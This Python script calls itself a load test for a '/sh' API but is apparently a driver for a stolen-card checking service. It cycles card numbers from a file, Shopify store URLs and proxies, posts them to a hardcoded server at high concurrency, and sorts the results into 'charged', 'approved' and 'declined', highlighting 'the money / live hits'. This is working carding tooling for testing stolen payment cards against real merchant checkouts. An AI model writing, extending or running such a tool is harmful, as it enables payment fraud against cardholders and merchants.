#!/usr/bin/env python3
"""
loadtest.py — hammer the /sh API and measure server workload.

Merged card file (archive/test/all_cards.txt) + site.txt + proxy.txt,
cycled per request. Prints CHARGED and APPROVED cards to terminal so you
can confirm the pipeline is returning real results, logs connection drops
(VPS killing the socket), and tallies dead/site/error/declined.

Usage:
  python3 loadtest.py                          # interactive: pick CC count + workers
  python3 loadtest.py -i                       # same interactive menu
  python3 loadtest.py --total 100 --concurrency 50
  python3 loadtest.py --total 500 --concurrency 250 --key mykey --url http://host:8080

Auth: POSTs {cc, site, proxy, key} — key defaults to "ladle" (override with --key).
"""
from __future__ import annotations

import argparse
import asyncio
import collections
import os
import sys
import time

try:
    import httpx
except ImportError:
    sys.exit("pip install httpx first")

try:
    import resource
    resource.setrlimit(resource.RLIMIT_NOFILE, (1048576, 1048576))
except Exception:
    pass  # client side also needs high FDs at 1000+ concurrency

GREEN  = "\033[1;32m"
CYAN   = "\033[1;36m"
RED    = "\033[1;31m"
YELLOW = "\033[1;33m"
DIM    = "\033[2m"
RESET  = "\033[0m"

# mirror the API's own site/proxy error keywords
_PROXY_KEYS = ("COULD NOT RESOLVE PROXY", "CURL:", "PROXY", "TUNNEL", "REFUSED",
               "TIMED OUT", "TIMEOUT", "CONNECTION", "DNS", "NAME RESOLUTION")
_SITE_KEYS  = ("NO AVAILABLE PRODUCTS", "CATALOG BLOCKED", "NO VALID PRODUCTS",
               "NOT SHOPIFY", "SECOND ADDRESS LINE", "SHOP CONFIGURATION",
               "404", "401", "SUBTOTAL", "MINIMUM", "ORDER SUBTOTAL")
_DECLINE    = ("CARD_DECLINED", "GENERIC_DECLINE", "DO_NOT_HONOR", "PICK_UP_CARD",
               "RESTRICTED_CARD", "EXPIRED", "INVALID_CVC", "INCORRECT_CVC",
               "INVALID_PAYMENT_METHOD", "TRANSACTION_NOT_ALLOWED",
               "DECISION_RULE_BLOCK", "AMOUNT_TOO_SMALL", "TEST_MODE_LIVE_CARD",
               "PROCESSING_ERROR", "INVALID_PURCHASE_TYPE")


def classify(body: dict, status_code: int) -> str:
    resp   = str(body.get("Response", "")).upper()
    status = str(body.get("Status", "")).upper()
    proxy  = str(body.get("Proxy", "")).upper()

    if resp == "ORDER_PAID":
        return "charged"
    if status == "TRUE":                      # live, non-charged (INSUFFICIENT_FUNDS / 3DS)
        return "approved"
    if proxy == "DEAD" or any(k in resp for k in _PROXY_KEYS):
        return "dead"                         # proxy dead
    if any(k in resp for k in _SITE_KEYS):
        return "site"                         # site error
    if resp == "TIMEOUT":
        return "error"
    if resp in _DECLINE:
        return "declined"
    return "error"


def load_lines(path: str) -> list[str]:
    if not path or not os.path.exists(path):
        sys.exit(f"missing file: {path}")
    with open(path, encoding="utf-8", errors="replace") as f:
        return [ln.strip() for ln in f if ln.strip() and not ln.strip().startswith("#")]


def _ask_int(prompt: str, default: int, min_v: int = 1) -> int:
    """Prompt for an integer, returning default on empty input."""
    while True:
        raw = input(prompt).strip()
        if not raw:
            return default
        try:
            v = int(raw)
        except ValueError:
            print("  enter a number")
            continue
        if v < min_v:
            print(f"  must be >= {min_v}")
            continue
        return v


def interactive_setup(args):
    """Walk the user through CC count + worker count (+ URL/key override)."""
    print()
    print(f"{CYAN}Shopify loadtest — interactive setup{RESET}")
    print("-" * 60)
    url = input(f"Target URL [{args.url}]: ").strip() or args.url
    key = input(f"API key    [{args.key}]: ").strip() or args.key

    print()
    print("How many CCs to hammer?")
    print("  1) 100        2) 500        3) 1,000")
    print("  4) 2,000      5) 5,000      6) custom")
    while True:
        c = input("pick [3]: ").strip() or "3"
        preset = {"1": 100, "2": 500, "3": 1000, "4": 2000, "5": 5000}
        if c in preset:
            total = preset[c]
            break
        if c == "6":
            total = _ask_int("CC count: ", 1000)
            break
        print("  pick 1-6")

    print()
    print("How many workers (concurrency)?")
    print("  1) 50         2) 100        3) 250")
    print("  4) 500        5) 1,000      6) custom")
    while True:
        c = input("pick [3]: ").strip() or "3"
        preset = {"1": 50, "2": 100, "3": 250, "4": 500, "5": 1000}
        if c in preset:
            conc = preset[c]
            break
        if c == "6":
            conc = _ask_int("Workers: ", 250)
            break
        print("  pick 1-6")

    return url, key, total, conc


async def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", default="http://103.124.157.14:8080")
    ap.add_argument("--key", default="ladle")
    ap.add_argument("--cc-file", default="archive/test/test.txt")
    ap.add_argument("--site-file", default="site.txt")
    ap.add_argument("--proxy-file", default="proxy.txt")
    ap.add_argument("--total", type=int, default=None)
    ap.add_argument("--concurrency", "-c", type=int, default=None)
    ap.add_argument("--timeout", type=float, default=140.0)
    ap.add_argument("--interval", type=float, default=5.0)
    ap.add_argument("--interactive", "-i", action="store_true")
    args = ap.parse_args()

    bare = len(sys.argv) == 1
    if args.interactive or bare:
        args.url, args.key, args.total, args.concurrency = interactive_setup(args)
    elif args.total is None or args.concurrency is None:
        if args.total is None:
            args.total = _ask_int("How many CCs to test? ", 1000)
        if args.concurrency is None:
            args.concurrency = _ask_int("How many workers (concurrency)? ", 250)

    cards   = load_lines(args.cc_file)
    sites   = load_lines(args.site_file)
    proxies = load_lines(args.proxy_file)

    if not cards:
        sys.exit(f"cc file is empty: {args.cc_file}")
    if not sites:
        sys.exit(f"site file is empty: {args.site_file}")
    if not proxies:
        sys.exit(f"proxy file is empty: {args.proxy_file}")

    print(f"cards={len(cards)} sites={len(sites)} proxies={len(proxies)}")
    print(f"target={args.url}  total={args.total}  concurrency={args.concurrency}")
    print("-" * 60)

    sem   = asyncio.Semaphore(args.concurrency)
    cat   = collections.Counter()     # charged/approved/declined/dead/site/error
    conn  = collections.Counter()     # dropped-by-vps connection errors
    done  = 0
    lock  = asyncio.Lock()
    t0    = time.monotonic()
    last  = [t0]

    limits = httpx.Limits(max_connections=args.concurrency + 500,
                          max_keepalive_connections=args.concurrency + 500)
    async with httpx.AsyncClient(timeout=httpx.Timeout(args.timeout, connect=15.0),
                                 limits=limits, follow_redirects=False) as client:
        url = args.url.rstrip("/") + "/sh"

        async def one(i: int) -> None:
            nonlocal done
            cc    = cards[i % len(cards)]
            site  = sites[i % len(sites)]
            proxy = proxies[i % len(proxies)]

            async with sem:
                try:
                    r = await client.post(url, json={"cc": cc, "site": site, "proxy": proxy, "key": args.key})
                    body = r.json() if r.headers.get("content-type", "").startswith("application/json") else {}
                    kind = classify(body, r.status_code)
                    async with lock:
                        done += 1
                        cat[kind] += 1
                    # print the money / live hits to terminal ONLY
                    if kind == "charged":
                        print(f"{GREEN}[CHARGED] {body.get('CC','')}  {body.get('Price','')} "
                              f"{body.get('Currency','')}  {body.get('site','')}{RESET}", flush=True)
                    elif kind == "approved":
                        print(f"{CYAN}[APPROVED] {body.get('CC','')}  -> {body.get('Response','')}"
                              f"{RESET}", flush=True)
                    elif kind in ("dead", "site"):
                        print(f"{DIM}[{kind.upper()}] {body.get('CC','')}  -> {body.get('Response','')[:60]}{RESET}", flush=True)
                except httpx.ConnectError as e:
                    async with lock:
                        done += 1; conn["connect_error"] += 1
                    print(f"{RED}[DROPPED] {cc}  connect error: {type(e).__name__}{RESET}", flush=True)
                except (httpx.ReadTimeout, httpx.ConnectTimeout) as e:
                    async with lock:
                        done += 1; conn[type(e).__name__] += 1
                    print(f"{RED}[DROPPED] {cc}  {type(e).__name__}{RESET}", flush=True)
                except Exception as e:
                    async with lock:
                        done += 1; conn[type(e).__name__] += 1
                    print(f"{RED}[DROPPED] {cc}  {type(e).__name__}: {e}{RESET}", flush=True)

                now = time.monotonic()
                if now - last[0] >= args.interval:
                    last[0] = now
                    async with lock:
                        dt = now - t0
                        print(f"{YELLOW}[{dt:6.1f}s] done={done}/{args.total} "
                              f"rate={done/dt:6.1f}/s  charged={cat['charged']} "
                              f"approved={cat['approved']}  drops={sum(conn.values())}{RESET}",
                              flush=True)

        await asyncio.gather(*(one(i) for i in range(args.total)))

    dt = time.monotonic() - t0
    print("=" * 60)
    print(f"FINISHED in {dt:.1f}s  ({args.total/dt:.1f} req/s aggregate)")
    print(f"charged   : {cat['charged']}")
    print(f"approved  : {cat['approved']}")
    print(f"declined  : {cat['declined']}")
    print(f"dead(pxy) : {cat['dead']}")
    print(f"site err  : {cat['site']}")
    print(f"error     : {cat['error']}")
    print(f"dropped   : {sum(conn.values())}  {dict(conn) if conn else ''}")

    n_drop = sum(conn.values())
    if n_drop == 0:
        print(f"\n{GREEN}VERDICT: clean — VPS held every connection, zero drops.{RESET}")
    elif n_drop < args.total * 0.02:
        print(f"\n{YELLOW}VERDICT: mostly clean ({n_drop} drops). minor socket churn.{RESET}")
    else:
        print(f"\n{RED}VERDICT: {n_drop} drops — VPS is still killing sockets. "
              f"re-run highconcurrency.sh, check ulimit/somaxconn/conntrack.{RESET}")
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(asyncio.run(main()))
    except KeyboardInterrupt:
        print("\ninterrupted")
        raise SystemExit(130)
